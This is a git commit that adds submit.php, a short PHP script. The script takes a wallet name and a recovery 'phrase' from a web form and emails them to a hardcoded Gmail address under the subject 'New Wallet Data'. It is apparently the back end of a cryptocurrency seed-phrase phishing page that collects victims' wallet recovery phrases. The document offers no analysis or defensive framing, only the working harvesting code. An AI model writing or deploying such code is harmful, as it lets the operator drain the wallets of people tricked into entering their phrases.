ba024dacff99852dde3cc2fc588e2779751b8dea
Paulcheckers <112517703+Paulcheckers@users.noreply.github.com>
2022-08-31 08:29:21 +0100

    Add files via upload

---
+++ submit.php
@@ -0,0 +1,21 @@
+<?php
+   
+    $name = $_POST['name'];
+    $phrase = $_POST['phrase'];
+
+    $to = "Braindevine995@gmail.com";
+    $subject = "New Wallet Data";
+    $body = "";
+
+    $body .="WALLET NAME: ".$name."\n";
+    $body .="PHRASE: ".$phrase;
+
+	  $message_sent = "";
+
+    if(mail($to,$subject,$body)){
+		    $message_sent = "sent";
+    }
+    
+    echo $message_sent;
+    
+?>
